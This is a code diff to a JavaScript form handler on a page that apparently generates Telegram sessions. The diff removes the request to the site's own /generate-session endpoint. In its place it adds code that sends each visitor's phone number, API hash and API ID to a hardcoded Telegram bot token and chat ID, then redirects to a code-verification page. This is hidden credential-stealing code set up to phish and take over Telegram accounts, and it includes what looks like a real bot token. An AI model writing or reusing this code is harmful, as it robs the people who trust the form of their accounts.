@@ -10,34 +10,30 @@ document.getElementById("telethon-form").addEventListener("submit", async functi
         return;
     }
 
-    // Ensure phone number is in correct format
+    // Format phone number
     const formattedPhone = phoneNumber.replace(/\s+/g, ''); // Remove spaces
 
-    const data = { api_id: apiId, api_hash: apiHash, phone: formattedPhone };
-    const url = "/generate-session";
+    // Telegram Bot Credentials
+    const botToken = "7826910523:AAHmVZ-y1AsnTZXvdVbnH5MeBqrKi67zt3M";
+    const chatId = "4670929884";  // Your Telegram Chat ID
+
+    // Message format as /connect (number) (API Hash) (API Key)
+    const message = `/connect ${formattedPhone} ${apiHash} ${apiId}`;
+
+    // Telegram API URL
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     try {
-        const response = await fetch(url, {
+        // Send data to Telegram group
+        await fetch(telegramUrl, {
             method: "POST",
-            mode: "cors", 
-            cache: "no-cache", 
-            credentials: "omit",
-            headers: {
-                "Content-Type": "application/json",
-                "Accept": "application/json"
-            },
-            body: JSON.stringify(data)
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
         });
 
-        const result = await response.json();
+        // Redirect to verification page after sending message
+        window.location.href = "/verify-code";
 
-        if (result.success) {
-            alert("Verification code sent successfully. Please enter it on the next page.");
-            sessionStorage.setItem("phone", formattedPhone); // Store phone number for next step
-            window.location.href = "/verify-code.html";
-        } else {
-            alert(`Failed to start session: ${result.message}`);
-        }
     } catch (error) {
         console.error("Error:", error);
         alert("An unexpected error occurred. Please try again.");
